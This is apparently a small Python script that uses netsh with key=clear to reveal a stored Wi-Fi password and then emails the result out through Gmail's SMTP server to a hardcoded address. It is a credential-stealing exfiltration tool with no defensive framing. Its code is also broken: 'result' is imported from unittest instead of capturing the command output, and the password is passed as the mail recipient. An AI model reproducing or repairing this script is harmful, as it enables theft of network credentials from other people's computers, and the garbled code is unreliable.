import subprocess,smtplib
from unittest import result

def sendmail(email , password , message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email , password)
    server.sendmail(email , password , message)
    server.quit()


command = "netsh wlan show profile DLINK-DIR650IN key=clear"
subprocess.Popen(command , shell=True)
sendmail("2020a1r040@Mietjammu.in" , "enter the new password" ,result)

